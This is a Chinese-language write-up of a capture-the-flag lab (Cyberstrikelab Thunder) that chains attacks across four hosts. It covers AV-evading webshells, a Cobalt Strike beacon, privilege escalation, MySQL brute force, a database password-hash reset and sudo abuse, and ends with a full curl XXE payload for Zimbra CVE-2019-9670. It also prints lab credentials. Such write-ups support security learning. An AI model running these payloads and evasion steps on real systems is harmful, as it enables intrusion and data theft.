# Cyberstrikelab Thunder Writeup




Cyberstrikelab Thunder Writeup



# 第一台主机
**信息收集**

对边界机进行初步的信息收集
![](file-20250325100455931.png)



访问 80 端口，发现是 ThinkPHP 框架
![](file-20250325100503620.png)

使用 ThinkPHP 漏洞工具检测，检测出多个历史漏洞
![](file-20250325100516384.png)

**文件包含**直接读取 flag
![](file-20250325100525921.png)

## 免杀上线
进一步利用，写马失败，换 `fputs` 函数写入失败，上传成功访问第一次能够成功，重新加载文件就会已经不存在
![](file-20250325100533557.png)

普通一句话怎么传都失败，怀疑是被防御干掉了，尝试搞成免杀 WebShell 再上传，使用 ByPassGodzilla 生成
![](file-20250325100541019.png)

命令执行成功，立刻看一下进程，发现一个 360 和 Defender
![](file-20250325100548413.png)
![](file-20250325100554861.png)

`root/root` 拿下数据库
![](file-20250325100603151.png)

上线 CS，同样要免杀一下才能上线
![](file-20250325100611149.png)

使用烂土豆提权至 `SYSTEM`，抓取 `Administrator` 管理员密码
![](file-20250325100617765.png)
```text
Administrator/Tp@cslKM
```

开启并连接 3389 远程桌面，将烦人的杀软和 `Defender` 关掉
![](file-20250325100626598.png)

## 内网信息收集
```text
shell arp -a
```
双网卡，一个内网网段 `172.20.57.*` 
![](file-20250325100636213.png)

对 `172.20.57.*` 进行存活探测、服务及漏洞扫描
![](file-20250325100701081.png)

# 第二台主机
## MYSQL 服务爆破
发现 `172.20.57.98` 内网机，这台机器是没有 Web 的，且没有其他任何信息。
参考了前面参与「Thunder」限时渗透赛 的师傅的 WriteUp，好像当时有提示 `CSLab` 作为账号密码

开始爆破 MYSQL 服务
![](file-20250325100709748.png)
```text
root/CSLab
```
MDUT 连接，进行 UDF 提权
![](file-20250325100716778.png)

这里也有 `Defender` 防御，做免杀马上线 CS
![](file-20250325100726442.png)

和边界机的相关配置和系统版本一致，再次尝试使用烂土豆提权，成功
![](file-20250325100733957.png)

关闭 `Defender` 
![](file-20250325100738843.png)
# 第三台主机
内网信息收集发现 10.0.0.34 机器，`iox` 开启二层隧道代理，访问 `Web` 页面
172.20.57.98 内网机器监听1081
![](file-20250325100744649.png)
172.20.56.32 边界机流量转发
![](file-20250325100753619.png)
攻击机访问
![](file-20250325100807752.png)

发现版本信息 `Z-BlogPHP 1.7.3`
![](file-20250325100812092.png)

翻阅 zblogphp 1.7.3 源码，发现 `/zb_system/function/lib/base/member.php` 文件中写了 `password` 的生成方式
![](file-20250325100818152.png)
![](file-20250325100826735.png)

将明文密码 (`$ps`) 进行 MD5 哈希，接着将哈希值与用户唯一码（`$guid`）拼接，然后对拼接后的字符串再次 MD5 加密，得到最终的哈希值
![](file-20250325100833061.png)

在第二台主机的数据库中管理着第三台机主机网站的库
![](file-20250325100840988.png)

用户唯一码如下
```text
GUID: 24d876c8772572cf839674c5a176e41c
name: CSLab
password: 6e272dff11557a1e7ad35d0fdf1162c3
```

构造脚本，输出新的 hash 密码，将其在数据库中替换
```python
import hashlib

ps = "123456"
guid = "24d876c8772572cf839674c5a176e41c"

first_hash = hashlib.md5(ps.encode('utf-8')).hexdigest()
result = hashlib.md5((first_hash + guid).encode('utf-8')).hexdigest()

print(result)

//30492f76a0fbcf3906cce8b4b566d6b6
```

登录成功
![](file-20250325100852441.png)

## 文件上传
尝试修改后台设置进行文件上传
![](file-20250325100903494.png)

失败，仍然无法上传
![](file-20250325100940145.png)
Z-Blog 后台存在模板文件 `.zba` 上传漏洞
![](file-20250325101008609.png)

上传 `shell.zba` 
![](file-20250325101018604.png)

访问 `http://ip/zb_users/theme/shell/template/shelll.php` ，成功
![](file-20250325101025125.png)
## 提权
Linux 系统，查询当前用户特权
```text
sudo -l
```
发现对 `/home/www/write.sh` 文件具有 `root` 权限且无需密码
![](file-20250325101031478.png)

修改文件，第二行加入 `/bin/bash`
![](file-20250325101036633.png)

执行文件，提权成功
![](file-20250325101200872.png)

读取 flag
![](file-20250325101241782.png)

# 第四台主机

## Zimbra XXE

发现新网段 `10.1.1.*` 
![](file-20250325101258936.png)

探测存活，发现10.1.1.56，对指定 IP 进行全端口扫描及漏洞扫描，发现存在 CVE-2019-9670 Vuln
![](file-20250325101308501.png)

读取 Flag
```bash
curl -k -X POST https://10.1.1.56/Autodiscover/Autodiscover.xml \
-H "Host: 10.1.1.56" \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/66.0" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-H "Accept-Encoding: gzip, deflate" \
-H "Referer: https://mail.****.com/zimbra/" \
-H "Content-Type: application/soap+xml" \
-H "Connection: close" \
-H "Cookie: ZM_TEST=true" \
--data '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///root/flag.txt" >]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
  <Request>
    <EMailAddress>aaaaa</EMailAddress>
    <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
  </Request>
</Autodiscover>'
```
![](file-20250325100225223.png)


---

> Author: [L1nq](https://github.com/L1nq0)  
> URL: https://sw1mblu3.fun/posts/cslab-thunder/  

